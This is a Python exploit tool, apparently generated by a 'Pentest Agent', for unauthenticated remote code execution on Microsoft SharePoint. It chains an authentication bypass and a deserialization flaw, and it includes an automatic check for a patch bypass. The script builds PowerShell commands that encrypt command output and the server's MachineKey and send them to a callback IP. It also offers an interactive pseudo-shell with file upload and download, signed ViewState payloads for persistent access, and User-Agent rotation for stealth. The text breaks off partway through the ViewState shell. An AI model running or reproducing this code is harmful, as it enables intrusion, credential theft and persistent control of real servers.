#!/usr/bin/env python3
"""
ToolShell Exploit - CVE-2025-49706 (Auth Bypass) + CVE-2025-49704 (Deserialization RCE)
Microsoft SharePoint Server Unauthenticated Remote Code Execution

This tool exploits two chained vulnerabilities:
1. CVE-2025-49706: Authentication bypass via Referer header manipulation
2. CVE-2025-49704: Deserialization RCE via DataSetSurrogateSelector in ToolPane.aspx

Capabilities:
- Unauthenticated Remote Code Execution on SharePoint Server
- MachineKey extraction via HTTP callback (no file artifacts)
- MachineKey extraction via temp file (with cleanup instructions)
- ViewState payload generation for persistence

Based on research from:
- Eye Security: https://research.eye.security/sharepoint-under-siege/
- Code White GmbH Pwn2Own Berlin 2025 demonstration  
- Viettel Cyber Security

Affected versions:
- SharePoint Server 2016
- SharePoint Server 2019  
- SharePoint Server Subscription Edition < 16.0.18526.20508

Requirements:
- Custom ysoserial.exe with DataSetXML gadget (included in ToolShell package)

Usage:
  # Recommended: HTTP callback exfiltration (cleanest - no file artifacts)
  python toolshell.py -t https://sharepoint.local --auto-pwn \
    --ysoserial C:\Tools\ysoserial.exe --callback-ip YOUR_IP

  # Alternative: File-based extraction
  python toolshell.py -t https://sharepoint.local --auto-pwn \
    --ysoserial C:\Tools\ysoserial.exe

Author: Pentest Agent
Date: January 2026

DISCLAIMER: For authorized security testing only.
"""

import argparse
import requests
import urllib3
import sys
import re
import base64
import gzip
import subprocess
import os
import time
import threading
import random
import secrets
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Exploit endpoints
TOOLPANE_PATH = "/_layouts/15/ToolPane.aspx"
TOOLPANE_PARAMS = "DisplayMode=Edit&a=/ToolPane.aspx"

# Auth bypass - critical header
AUTH_BYPASS_REFERER = "/_layouts/SignOut.aspx"

# Randomized User-Agents for stealth (common browsers)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
]

# XOR encryption key (generated per session for callback encryption)
CALLBACK_XOR_KEY = None


def get_random_ua():
    """Get a random User-Agent from the list"""
    return random.choice(USER_AGENTS)


def generate_xor_key():
    """Generate a random 16-byte XOR key for callback encryption"""
    return secrets.token_hex(16)


def xor_encrypt(data: str, key: str) -> str:
    """XOR encrypt data and return base64 encoded result"""
    key_bytes = bytes.fromhex(key)
    data_bytes = data.encode('utf-8')
    encrypted = bytes([data_bytes[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data_bytes))])
    return base64.b64encode(encrypted).decode('ascii')


def xor_decrypt(data_b64: str, key: str) -> str:
    """Decrypt base64 encoded XOR encrypted data"""
    key_bytes = bytes.fromhex(key)
    encrypted = base64.b64decode(data_b64)
    decrypted = bytes([encrypted[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(encrypted))])
    return decrypted.decode('utf-8', errors='ignore')


class ToolShellExploit:
    def __init__(self, target, proxy=None, timeout=30, ysoserial_path=None):
        global CALLBACK_XOR_KEY
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.ysoserial_path = ysoserial_path
        self.user_agent = get_random_ua()  # Random UA per session
        self.use_bypass = False  # Will be set automatically if needed
        self.bypass_mode_active = False  # Track if we're using CVE-2025-53770 bypass
        
        # Generate XOR key for encrypted callbacks
        CALLBACK_XOR_KEY = generate_xor_key()
        self.xor_key = CALLBACK_XOR_KEY
        
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
    
    def build_encrypted_exfil_cmd(self, command, callback_ip, callback_port):
        """
        Build PowerShell command that executes a command, XOR encrypts the output,
        and sends it via HTTP POST callback.
        
        The XOR key is embedded in the PowerShell script and must match self.xor_key.
        """
        callback_url = f"http://{callback_ip}:{callback_port}"
        
        # PowerShell XOR encryption inline
        # $k = key as byte array, $d = data bytes, XOR each byte, base64 encode result
        exfil_cmd = (
            f"$o = ({command}) 2>&1 | Out-String; "
            f"$k = [byte[]]@({','.join(str(b) for b in bytes.fromhex(self.xor_key))}); "
            f"$d = [Text.Encoding]::UTF8.GetBytes($o); "
            f"$e = [byte[]]::new($d.Length); "
            f"for($i=0;$i -lt $d.Length;$i++){{$e[$i]=$d[$i] -bxor $k[$i % $k.Length]}}; "
            f"$b = [Convert]::ToBase64String($e); "
            f"Invoke-WebRequest -Uri '{callback_url}' -Method POST -Body $b -UseBasicParsing"
        )
        return exfil_cmd
    
    def build_encrypted_machinekey_exfil_cmd(self, callback_ip, callback_port):
        """
        Build PowerShell command to extract MachineKey from web.config,
        XOR encrypt it, and send via HTTP POST callback.
        """
        callback_url = f"http://{callback_ip}:{callback_port}"
        
        exfil_cmd = (
            f"$o = (sls machineKey (gci C:/inetpub/wwwroot/wss/VirtualDirectories/*/web.config -EA SilentlyContinue|Select -First 1).FullName).Line; "
            f"$k = [byte[]]@({','.join(str(b) for b in bytes.fromhex(self.xor_key))}); "
            f"$d = [Text.Encoding]::UTF8.GetBytes($o); "
            f"$e = [byte[]]::new($d.Length); "
            f"for($i=0;$i -lt $d.Length;$i++){{$e[$i]=$d[$i] -bxor $k[$i % $k.Length]}}; "
            f"$b = [Convert]::ToBase64String($e); "
            f"Invoke-WebRequest -Uri '{callback_url}' -Method POST -Body $b -UseBasicParsing"
        )
        return exfil_cmd

    @staticmethod
    def gzip_base64_encode(data):
        """
        Gzip compress and base64 encode data for CompressedDataTable.
        Input: raw bytes (from ysoserial -o raw)
        Output: base64 string ready for CompressedDataTable attribute
        """
        if isinstance(data, str):
            data = data.encode()
        
        buf = BytesIO()
        with gzip.GzipFile(fileobj=buf, mode='wb') as gz:
            gz.write(data)
        
        compressed = buf.getvalue()
        return base64.b64encode(compressed).decode('ascii')
    
    @staticmethod
    def gzip_base64_decode(data):
        """
        Decode a CompressedDataTable value back to raw bytes.
        Useful for analyzing existing payloads.
        """
        compressed = base64.b64decode(data)
        buf = BytesIO(compressed)
        with gzip.GzipFile(fileobj=buf, mode='rb') as gz:
            return gz.read()
    
    def get_sharepoint_version(self):
        """Detect SharePoint version via OPTIONS request"""
        try:
            resp = self.session.options(
                self.target,
                headers={'User-Agent': self.user_agent},
                timeout=self.timeout
            )
            version = resp.headers.get('MicrosoftSharePointTeamServices', 'Unknown')
            return version
        except Exception as e:
            return f"Error: {e}"
    
    def check_vulnerable(self):
        """
        Check if target is potentially vulnerable by testing auth bypass.
        A vulnerable server will return 200/302 without auth when using the bypass referer.
        """
        url = f"{self.target}{TOOLPANE_PATH}?{TOOLPANE_PARAMS}"
        
        # Use full URL for Referer - some SharePoint configs require it
        headers = {
            'User-Agent': self.user_agent,
            'Referer': f'{self.target}{AUTH_BYPASS_REFERER}',
        }
        
        try:
            resp = self.session.get(url, headers=headers, timeout=self.timeout, allow_redirects=False)
            
            # Vulnerable if we get 200 or 302 (not 401/403)
            if resp.status_code in [200, 302]:
                return True, resp.status_code
            return False, resp.status_code
        except Exception as e:
            return False, str(e)

    def test_rce_method(self, callback_ip, callback_port, test_timeout=10):
        """
        Test if RCE works by sending a simple callback command.
        Returns True if callback received, False otherwise.
        
        This is used to determine which exploit variant works:
        - Normal payload (CVE-2025-49704)
        - Bypass payload (CVE-2025-53770)
        """
        if not self.ysoserial_path or not os.path.exists(self.ysoserial_path):
            return False
            
        # Simple test command - just callback with "OK"
        test_cmd = (
            f"$k = [byte[]]@({','.join(str(b) for b in bytes.fromhex(self.xor_key))}); "
            f"$d = [Text.Encoding]::UTF8.GetBytes('RCE_TEST_OK'); "
            f"$e = [byte[]]::new($d.Length); "
            f"for($i=0;$i -lt $d.Length;$i++){{$e[$i]=$d[$i] -bxor $k[$i % $k.Length]}}; "
            f"$b = [Convert]::ToBase64String($e); "
            f"Invoke-WebRequest -Uri 'http://{callback_ip}:{callback_port}' -Method POST -Body $b -UseBasicParsing"
        )
        
        # Setup quick listener
        CallbackHandler.received_data = None
        CallbackHandler.shell_mode = True
        
        try:
            server = HTTPServer(('0.0.0.0', callback_port), CallbackHandler)
            server.timeout = test_timeout
            
            def handle_one():
                server.handle_request()
            
            listener_thread = threading.Thread(target=handle_one, daemon=True)
            listener_thread.start()
            
            time.sleep(0.2)  # Give listener time to start
            
            # Generate and send test payload
            compressed_gadget = self.generate_compressed_gadget(test_cmd)
            dwp_payload = self.build_dwp_payload(compressed_gadget)
            resp = self.send_payload(dwp_payload, verbose=False)
            
            if resp and resp.status_code in [200, 302, 500]:
                # Wait for callback
                listener_thread.join(timeout=test_timeout)
                
                if CallbackHandler.received_data:
                    output = CallbackHandler.received_data.get('output', '')
                    if 'RCE_TEST_OK' in output:
                        return True
            
            return False
        except Exception:
            return False
        finally:
            try:
                server.server_close()
            except:
                pass
            CallbackHandler.shell_mode = False

    def detect_exploit_method(self, callback_ip, callback_port):
        """
        Automatically detect which exploit method works:
        1. First try normal CVE-2025-49704 payload
        2. If that fails, try CVE-2025-53770 bypass
        
        Returns tuple: (method_works, method_name)
        - ('normal', 'CVE-2025-49704') - Original vuln works
        - ('bypass', 'CVE-2025-53770') - Need whitespace bypass
        - (None, None) - Both patched
        """
        # First try normal payload
        self.use_bypass = False
        print("[*] Testing CVE-2025-49704 (normal payload)...")
        if self.test_rce_method(callback_ip, callback_port):
            print("[+] CVE-2025-49704 - RCE successful!")
            self.bypass_mode_active = False
            return ('normal', 'CVE-2025-49704')
        
        print("[-] CVE-2025-49704 patched or blocked")
        
        # Try bypass
        self.use_bypass = True
        print("[*] Testing CVE-2025-53770 (whitespace bypass)...")
        if self.test_rce_method(callback_ip, callback_port):
            print("[+] CVE-2025-53770 bypass - RCE successful!")
            self.bypass_mode_active = True
            return ('bypass', 'CVE-2025-53770')
        
        print("[-] CVE-2025-53770 also patched")
        self.use_bypass = False
        return (None, None)

    def run_ysoserial(self, command, output_format='losformatter'):
        """
        Execute ysoserial.exe to generate a gadget payload.
        
        This exploit requires the custom ysoserial.net with DataSetXML gadget
        that implements the DataSetSurrogateSelector bypass (CVE-2025-49704).
        
        The custom ysoserial is available in the ToolShell exploit package:
        C:\\Tools_manual\\ToolShell\\ysoserial\\ysoserial.exe
        
        Args:
            command: Command to execute on target
            output_format: Not used (custom ysoserial outputs gzip+base64)
            
        Returns:
            Tuple of (gadget_type, payload)
        """
        if not self.ysoserial_path:
            raise ValueError("ysoserial.exe path not configured")
        
        if not os.path.exists(self.ysoserial_path):
            raise FileNotFoundError(f"ysoserial.exe not found at: {self.ysoserial_path}")
        
        try:
            # Try the custom ysoserial with DataSetXML gadget
            # This gadget implements the DataSetSurrogateSelector bypass
            # discovered by Viettel Cyber Security (CVE-2025-49704)
            #
            # IMPORTANT: The gadget requires commands to be wrapped with "powershell -c"
            # to properly execute through the deserialization chain
            wrapped_command = f"powershell -c {command}"
            
            cmd = [
                self.ysoserial_path,
                '-g', 'DataSetXML',
                '-f', 'BinaryFormatter',
                '-c', wrapped_command,
                '--rawcmd',
                '-o', 'gzip'
            ]
            
            print(f"[*] Executing: {' '.join(cmd)}")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0 and result.stdout.strip():
                compressed_gadget = result.stdout.strip()
                print(f"[+] Generated compressed gadget: {len(compressed_gadget)} chars (gzip+base64)")
                return ('datasetxml', compressed_gadget)
            
            # DataSetXML gadget not available - this is the custom gadget
            stderr = result.stderr if result.stderr else "No error output"
            
            # Check if it's a "gadget not found" type error
            if 'DataSetXML' in stderr or 'not found' in stderr.lower() or 'unknown' in stderr.lower():
                print(f"[-] DataSetXML gadget not available in this ysoserial.exe")
                print(f"[!] This exploit requires the custom ysoserial.net with DataSetXML gadget")
                print(f"[!] The DataSetXML gadget implements the DataSetSurrogateSelector bypass (CVE-2025-49704)")
                print(f"")
                print(f"[!] Use the custom ysoserial from the ToolShell exploit:")
                print(f"[!]   C:\\Tools_manual\\ToolShell\\ysoserial\\ysoserial.exe")
                print(f"")
                print(f"[!] Or download from: https://github.com/l0ggg/ToolShell")
                raise RuntimeError(
                    "Standard ysoserial.net does not have the DataSetXML gadget. "
                    "This exploit requires the custom ysoserial.net from ToolShell."
                )
            else:
                raise RuntimeError(f"ysoserial.exe failed: {stderr}")
            
        except subprocess.TimeoutExpired:
            raise RuntimeError("ysoserial.exe timed out")

    def generate_compressed_gadget(self, command):
        """
        Generate a complete CompressedDataTable payload for the given command.
        
        Uses the custom ysoserial.net with DataSetXML gadget which outputs
        gzip+base64 directly, ready for the CompressedDataTable attribute.
        
        The DataSetXML gadget implements the DataSetSurrogateSelector bypass
        (CVE-2025-49704) discovered by Viettel Cyber Security:
        - Uses generic type wrapping (List<ExpandedWrapper<...>>) to bypass type check
        - TypeNameParser returns typeof(object) when no comma outside brackets
        - Chains ObjectDataProvider -> LosFormatter.Deserialize for RCE
        
        Args:
            command: Full PowerShell command string (e.g., 'powershell -c ...')
            
        Returns:
            Base64-encoded gzipped gadget ready for CompressedDataTable
        """
        gadget_type, payload = self.run_ysoserial(command)
        
        if gadget_type == 'datasetxml':
            # Custom ysoserial outputs ready-to-use gzip+base64
            return payload
        else:
            raise ValueError(f"Unexpected gadget type: {gadget_type}")

    def build_dwp_payload(self, compressed_gadget_b64):
        """
        Build the MSOTlPn_DWP parameter value containing the ExcelDataSet gadget.
        Structure matches the working l0ggg/ToolShell PoC.
        
        If use_bypass is enabled (CVE-2025-53770), adds trailing whitespace to
        Namespace and Tagprefix attributes to bypass CVE-2025-49704 patch.
        """
        # Note: Must match exact whitespace/formatting of the working PoC
        # Leading newline and indentation before <%@ Register are required
        
        # CVE-2025-53770: Trailing whitespace in Namespace and Tagprefix bypasses the patch
        # Credit: Soroush Dalili (@irsdl)
        if self.use_bypass:
            namespace = 'Namespace="Microsoft.PerformancePoint.Scorecards "'  # trailing space
            tagprefix = 'Tagprefix="Scorecard "'  # trailing space
        else:
            namespace = 'Namespace="Microsoft.PerformancePoint.Scorecards"'
            tagprefix = 'Tagprefix="Scorecard"'
        
        dwp = f"""
    <%@ Register {tagprefix} {namespace} Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>

<asp:UpdateProgress ID="UpdateProgress1" DisplayAfter="10" 
runat="server" AssociatedUpdatePanelID="upTest">
<ProgressTemplate>
  <div class="divWaiting">            
    <Scorecard:ExcelDataSet CompressedDataTable="{compressed_gadget_b64}" DataTable-CaseSensitive="false" runat="server">
</Scorecard:ExcelDataSet>
  </div>
</ProgressTemplate>
</asp:UpdateProgress>
    """
        return dwp

    def run_shell(self, callback_ip, callback_port=8888, cmd_timeout=30):
        """
        Run an interactive pseudo-shell that exfiltrates command output via HTTP callback.
        
        This provides a shell-like experience where you can run commands and see output,
        even though there's no actual reverse shell connection.
        
        Args:
            callback_ip: Your IP address to receive callbacks
            callback_port: Port for the HTTP listener (default: 8888)
            cmd_timeout: Timeout for each command (default: 30s)
        """
        print("\n" + "=" * 70)
        print("  PSEUDO-INTERACTIVE SHELL - ToolShell")
        print("  Commands are executed via deserialization, output via HTTP callback")
        print("=" * 70)
        print(f"  Target:   {self.target}")
        print(f"  Callback: {callback_ip}:{callback_port}")
        print("=" * 70)
        print("  Type 'exit' or 'quit' to end session")
        print("  Type 'help' for available commands")
        print("=" * 70 + "\n")
        
        # Enable shell mode for cleaner output
        CallbackHandler.shell_mode = True
        
        # Track current working directory (for display, actual cd happens on target)
        cwd = "C:\\"
        
        # Start persistent HTTP server in background
        server = HTTPServer((callback_ip, callback_port), CallbackHandler)
        server.timeout = cmd_timeout
        
        def handle_requests():
            """Handle HTTP requests in background"""
            while getattr(server, '_running', True):
                try:
                    server.handle_request()
                except:
                    break
        
        server._running = True
        server_thread = threading.Thread(target=handle_requests, daemon=True)
        server_thread.start()
        
        def execute_cmd(ps_cmd):
            """Execute a PowerShell command and return output"""
            exfil_cmd = self.build_encrypted_exfil_cmd(ps_cmd, callback_ip, callback_port)
            CallbackHandler.received_data = None
            
            try:
                compressed_gadget = self.generate_compressed_gadget(exfil_cmd)
                dwp_payload = self.build_dwp_payload(compressed_gadget)
                resp = self.send_payload(dwp_payload, verbose=False)
                
                if resp is None or resp.status_code not in [200, 302, 500]:
                    return None, f"Request failed (HTTP {resp.status_code if resp else 'error'})"
                
                start_time = time.time()
                while CallbackHandler.received_data is None:
                    time.sleep(0.1)
                    if time.time() - start_time > cmd_timeout:
                        return None, "Timeout waiting for output"
                
                return CallbackHandler.received_data.get('output', ''), None
            except Exception as e:
                return None, str(e)
        
        try:
            while True:
                try:
                    # Get command from user
                    cmd = input(f"\033[1;32mSP {cwd}>\033[0m ").strip()
                    
                    if not cmd:
                        continue
                    
                    if cmd.lower() in ['exit', 'quit']:
                        print("[*] Exiting shell...")
                        break
                    
                    if cmd.lower() == 'help':
                        print("""
\033[1mFile Operations:\033[0m
  ls [path]           - List directory contents (default: current dir)
  dir [path]          - Alias for ls
  cd <path>           - Change directory
  pwd                 - Print working directory
  cat <file>          - Display file contents
  download <remote> [local]  - Download file to local machine
  upload <local> <remote>    - Upload file to target

\033[1mGeneral:\033[0m
  <any command>       - Execute PowerShell command on target
  exit/quit           - Exit the shell
  help                - Show this help

\033[1mNotes:\033[0m
  - All commands run as the SharePoint service account
  - File transfers are base64 encoded (encrypted in transit)
  - Large files may take time due to RCE roundtrip
""")
                        continue
                    
                    # ===== FILE OPERATIONS =====
                    
                    # ls / dir command
                    if cmd.lower() == 'ls' or cmd.lower() == 'dir':
                        ps_cmd = f"Get-ChildItem -Path '{cwd}' | Format-Table Mode,LastWriteTime,Length,Name -AutoSize"
                        output, err = execute_cmd(ps_cmd)
                        if err:
                            print(f"[-] {err}")
                        elif output:
                            print(output.rstrip())
                        continue
                    
                    if cmd.lower().startswith('ls ') or cmd.lower().startswith('dir '):
                        path = cmd[3:].strip() if cmd.lower().startswith('ls ') else cmd[4:].strip()
                        if not path.startswith('C:') and not path.startswith('\\\\'):
                            sep = '\\'
                            path = cwd.rstrip(sep) + sep + path
                        ps_cmd = f"Get-ChildItem -Path '{path}' | Format-Table Mode,LastWriteTime,Length,Name -AutoSize"
                        output, err = execute_cmd(ps_cmd)
                        if err:
                            print(f"[-] {err}")
                        elif output:
                            print(output.rstrip())
                        continue
                    
                    # cd command
                    if cmd.lower().startswith('cd '):
                        new_path = cmd[3:].strip()
                        if new_path == '..':
                            # Go up one directory
                            cwd = '\\'.join(cwd.rstrip('\\').split('\\')[:-1])
                            if not cwd:
                                cwd = 'C:\\'
                            elif not cwd.endswith('\\'):
                                cwd += '\\'
                        elif new_path.startswith('C:') or new_path.startswith('\\\\'):
                            # Absolute path
                            cwd = new_path if new_path.endswith('\\') else new_path + '\\'
                        else:
                            # Relative path
                            sep = '\\'
                            cwd = cwd.rstrip(sep) + sep + new_path + sep
                        # Verify path exists
                        ps_cmd = f"if(Test-Path '{cwd}'){{'OK'}}else{{'NOTFOUND'}}"
                        output, err = execute_cmd(ps_cmd)
                        if err:
                            print(f"[-] {err}")
                        elif output and 'NOTFOUND' in output:
                            print(f"[-] Path not found: {cwd}")
                            cwd = "C:\\"
                        continue
                    
                    # pwd command
                    if cmd.lower() == 'pwd':
                        print(cwd)
                        continue
                    
                    # cat command
                    if cmd.lower().startswith('cat '):
                        filepath = cmd[4:].strip()
                        if not filepath.startswith('C:') and not filepath.startswith('\\\\'):
                            sep = '\\'
                            filepath = cwd.rstrip(sep) + sep + filepath
                        ps_cmd = f"Get-Content -Path '{filepath}' -Raw"
                        output, err = execute_cmd(ps_cmd)
                        if err:
                            print(f"[-] {err}")
                        elif output:
                            print(output.rstrip())
                        continue
                    
                    # download command
                    if cmd.lower().startswith('download '):
                        parts = cmd[9:].strip().split(' ', 1)
                        remote_path = parts[0]
                        if not remote_path.startswith('C:') and not remote_path.startswith('\\\\'):
                            sep = '\\'
                            remote_path = cwd.rstrip(sep) + sep + remote_path
                        
                        # Default local filename = same as remote
                        local_path = parts[1] if len(parts) > 1 else os.path.basename(remote_path)
                        
                        print(f"[*] Downloading {remote_path} -> {local_path}")
                        ps_cmd = f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{remote_path}'))"
                        output, err = execute_cmd(ps_cmd)
                        if err:
                            print(f"[-] {err}")
                        elif output:
                            try:
                                file_data = base64.b64decode(output.strip())
                                with open(local_path, 'wb') as f:
                                    f.write(file_data)
                                print(f"[+] Downloaded {len(file_data)} bytes to {local_path}")
                            except Exception as e:
                                print(f"[-] Failed to decode/save: {e}")
                        continue
                    
                    # upload command
                    if cmd.lower().startswith('upload '):
                        parts = cmd[7:].strip().split(' ', 1)
                        if len(parts) < 2:
                            print("[-] Usage: upload <local_file> <remote_path>")
                            continue
                        local_path = parts[0]
                        remote_path = parts[1]
                        if not remote_path.startswith('C:') and not remote_path.startswith('\\\\'):
                            sep = '\\'
                            remote_path = cwd.rstrip(sep) + sep + remote_path
                        
                        if not os.path.exists(local_path):
                            print(f"[-] Local file not found: {local_path}")
                            continue
                        
                        print(f"[*] Uploading {local_path} -> {remote_path}")
                        try:
                            with open(local_path, 'rb') as f:
                                file_data = f.read()
                            b64_data = base64.b64encode(file_data).decode('ascii')
                            
                            # Write via PowerShell using script block for proper callback
                            # Script block syntax & { } ensures semicolon-separated statements
                            # work correctly when wrapped in $o = (...)
                            ps_cmd = f"& {{ [IO.File]::WriteAllBytes('{remote_path}',[Convert]::FromBase64String('{b64_data}')); 'OK' }}"
                            output, err = execute_cmd(ps_cmd)
                            if err:
                                print(f"[-] {err}")
                            elif output and 'OK' in output:
                                print(f"[+] Uploaded {len(file_data)} bytes to {remote_path}")
                            else:
                                print(f"[-] Upload may have failed: {output}")
                        except Exception as e:
                            print(f"[-] Error: {e}")
                        continue
                    
                    # ===== DEFAULT: Execute as PowerShell command =====
                    output, err = execute_cmd(cmd)
                    if err:
                        print(f"[-] {err}")
                    elif output:
                        print(output.rstrip())
                
                except KeyboardInterrupt:
                    print("\n[*] Use 'exit' to quit")
                    continue
        
        finally:
            # Clean shutdown
            server._running = False
            CallbackHandler.shell_mode = False
            server.server_close()
            print("[*] Shell terminated")

    def generate_viewstate_payload(self, command, validation_key, decryption_key, 
                                    validation_alg, generator, gadget="TypeConfuseDelegate"):
        """
        Generate a signed ViewState payload using ysoserial.exe.
        
        Args:
            command: Command to execute
            validation_key: MachineKey validationKey
            decryption_key: MachineKey decryptionKey  
            validation_alg: Validation algorithm (e.g., HMACSHA256)
            generator: __VIEWSTATEGENERATOR value from target page
            gadget: Gadget to use (default: TypeConfuseDelegate)
            
        Returns:
            URL-encoded ViewState payload
        """
        if not self.ysoserial_path or not os.path.exists(self.ysoserial_path):
            raise ValueError(f"ysoserial.exe not found: {self.ysoserial_path}")
        
        # Build ysoserial command for ViewState
        cmd = [
            self.ysoserial_path,
            '-p', 'ViewState',
            '-g', gadget,
            '-c', command,
            f'--validationkey={validation_key}',
            f'--decryptionkey={decryption_key}',
            f'--validationalg={validation_alg}',
            f'--generator={generator}',
            '--islegacy'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if result.returncode != 0:
            raise RuntimeError(f"ysoserial.exe failed: {result.stderr}")
        
        # ysoserial outputs URL-encoded payload
        return result.stdout.strip()

    def run_viewstate_cmd(self, command, validation_key, decryption_key, validation_alg,
                          callback_ip, callback_port=8888, target_page=None, verbose=False):
        """
        Execute a command via signed ViewState payload.
        
        This method uses extracted MachineKey to sign ViewState payloads,
        providing an alternative RCE method that survives patching of the
        original ToolPane.aspx deserialization vulnerability.
        
        Args:
            command: Command to execute
            validation_key: MachineKey validationKey
            decryption_key: MachineKey decryptionKey
            validation_alg: Validation algorithm (e.g., HMACSHA256)
            callback_ip: IP for HTTP callback
            callback_port: Port for callback (default: 8888)
            target_page: Target page with ViewState (default: ToolPane.aspx)
            verbose: Enable verbose output
            
        Returns:
            Command output received via callback, or None
        """
        # Default to ToolPane.aspx but this works on many pages
        if target_page is None:
            target_page = f"{self.target}{TOOLPANE_PATH}?{TOOLPANE_PARAMS}"
        elif not target_page.startswith('http'):
            target_page = f"{self.target}{target_page}"
        
        # Get ViewStateGenerator from target page
        print(f"[*] Fetching ViewStateGenerator from: {target_page}")
        tokens = self.get_viewstate_tokens(page_url=target_page, verbose=verbose)
        if not tokens or 'viewstategenerator' not in tokens:
            print("[-] Could not extract ViewStateGenerator from page")
            return None
        
        generator = tokens['viewstategenerator']
        
        # Display configuration summary
        print("\n" + "-" * 50)
        print("[+] VIEWSTATE RCE CONFIGURATION:")
        print("-" * 50)
        print(f"    Target Page:     {target_page}")
        print(f"    Generator:       {generator}")
        print(f"    ValidationKey:   {validation_key[:32]}...")
        print(f"    DecryptionKey:   {decryption_key[:32]}...")
        print(f"    ValidationAlg:   {validation_alg}")
        print(f"    Callback:        {callback_ip}:{callback_port}")
        print("-" * 50 + "\n")
        
        # Build encrypted callback exfiltration command
        # Need to wrap in powershell -c for ViewState execution
        inner_cmd = self.build_encrypted_exfil_cmd(command, callback_ip, callback_port)
        exfil_cmd = f'powershell -c "{inner_cmd}"'
        
        # Generate ViewState payload
        print(f"[*] Generating signed ViewState payload...")
        try:
            viewstate = self.generate_viewstate_payload(
                exfil_cmd, validation_key, decryption_key, validation_alg, generator
            )
        except Exception as e:
            print(f"[-] Failed to generate ViewState: {e}")
            return None
        
        if verbose:
            print(f"[DEBUG] ViewState length: {len(viewstate)}")
        
        # Start listener
        CallbackHandler.received_data = None
        CallbackHandler.shell_mode = True
        
        server = HTTPServer(('0.0.0.0', callback_port), CallbackHandler)
        server.timeout = 30
        
        def handle_one():
            server.handle_request()
        
        listener_thread = threading.Thread(target=handle_one, daemon=True)
        listener_thread.start()
        time.sleep(0.3)
        
        # Send ViewState payload
        print(f"[*] Sending ViewState payload to: {target_page}")
        
        headers = {
            'User-Agent': self.user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.target}{AUTH_BYPASS_REFERER}',
        }
        
        body = f'__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={generator}'
        
        try:
            resp = self.session.post(
                target_page, 
                data=body, 
                headers=headers, 
                timeout=30
            )
            print(f"[*] Response: HTTP {resp.status_code}")
            
            # Wait for callback
            print("[*] Waiting for callback...")
            listener_thread.join(timeout=30)
            
            if CallbackHandler.received_data:
                output = CallbackHandler.received_data.get('output', '')
                return output
            else:
                print("[-] No callback received")
                return None
                
        except Exception as e:
            print(f"[-] Error: {e}")
            return None
        finally:
            server.server_close()
            CallbackHandler.shell_mode = False

    def run_viewstate_shell(self, validation_key, decryption_key, validation_alg,
                            callback_ip, callback_port=8888, target_page=None, cmd_timeout=30):
        """
        Run an interactive pseudo-shell using signed ViewState payloads.
        
        This is similar to run_shell() but uses ViewState RCE instead of
        the ToolPane.aspx deserialization vulnerability.
        
        Args:
            validation_key: MachineKey validationKey
            decryption_key: MachineKey decryptionKey
            validation_alg: Validation algorithm
            callback_ip: IP for HTTP callback
            callback_port: Port for callback
            target_page: Target page for ViewState (default: ToolPane.aspx)
            cmd_timeout: Timeout for each command
        """
        # Resolve target page
        if target_page is None:
            target_page = f"{self.target}{TOOLPANE_PATH}?{TOOLPANE_PARAMS}"
        elif not target_page.startswith('http'):
            target_page = f"{self.target}{target_page}"
        
        # Get ViewStateGenerator from target page
        print(f"\n[*] Fetching ViewStateGenerator from: {target_page}")
        tokens = self.get_viewstate_tokens(page_url=target_page)
        if not tokens or 'viewstategenerator' not in tokens:
            print("[-] Could not get ViewStateGenerator")
            return
        generator = tokens['viewstategenerator']
        
        # Display configuration
        print("\n" + "=" * 70)
        print("  VIEWSTATE SHELL - Signed Payload RCE")
        print("=" * 70)
        print(f"  Target:         {self.target}")
        print(f"  ViewState Page: {target_page}")
        print(f"  Generator:      {generator}")
        print(f"  ValidationKey:  {validation_key[:32]}...")
        print(f"  DecryptionKey:  {decryption_key[:32]}...")
        print(f"  ValidationAlg:  {validation_alg}")
        print(f"  Callback:       {callback_ip}:{callback_port}")
        print("=" * 70)
        print("  Type 'exit' or 'quit' to end session")
        print("=" * 70 + "\n")
        
        # Start persistent HTTP server
        CallbackHandler.shell_mode = True
        server = HTTPServer(('0.0.0.0', callback_port), CallbackHandler)
        server.timeout = cmd_timeout
        
        def handle_requests():
            while getattr(server, '_running', True):
                try:
                    server.handle_request()
                except:
                    break
        
        server._running = True
        server_thread = threading.Thread(target=handle_requests, daemon=True)
        server_thread.start()
        
        try:
            while True:
                try:
                    cmd = input("VS> ").strip()
                    
                    if not cmd:
                        continue
                    if cmd.lower() in ['exit', 'quit']:
                        print("[*] Exiting ViewState shell...")
                        break
                    if cmd.lower() == 'help':
                        print("  Commands are sent via signed ViewState payloads")
